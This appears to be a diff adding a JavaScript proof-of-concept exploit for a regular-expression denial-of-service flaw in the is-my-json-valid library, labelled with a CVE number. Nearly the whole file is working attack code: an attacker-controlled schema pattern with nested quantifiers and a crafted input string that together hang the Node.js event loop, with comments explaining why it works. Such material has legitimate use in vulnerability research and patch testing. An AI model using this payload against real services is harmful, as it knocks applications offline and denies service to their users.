@@ -1,0 +1,29 @@
+```javascript
+// Exploit: ReDoS in is-my-json-valid (CVE-2021-3765)
+// The library compiles a JSON Schema "pattern" directly into `new RegExp(p)`
+// (see index.js) with no safety checks. Any pattern under attacker control
+// (e.g. a schema loaded from user input, an API config, etc.) combined with
+// a crafted input string causes catastrophic backtracking and hangs the
+// Node.js event loop.
+
+var validator = require("is-my-json-valid");
+
+// Attacker-controlled schema pattern (classic exponential-backtracking regex)
+var schema = {
+  type: "string",
+  pattern: "^(a+)+$"
+};
+
+var validate = validator(schema);
+
+// Attacker-controlled input: many "a"s followed by a char that fails the match,
+// forcing the regex engine into catastrophic backtracking.
+var payload = "a".repeat(35) + "!";
+
+console.log("Validating malicious payload against attacker-controlled pattern...");
+console.log("Process will hang (DoS) instead of returning quickly:");
+
+var start = Date.now();
+validate(payload); // never returns in a reasonable time
+console.log("done in", Date.now() - start, "ms"); // never reached
+```
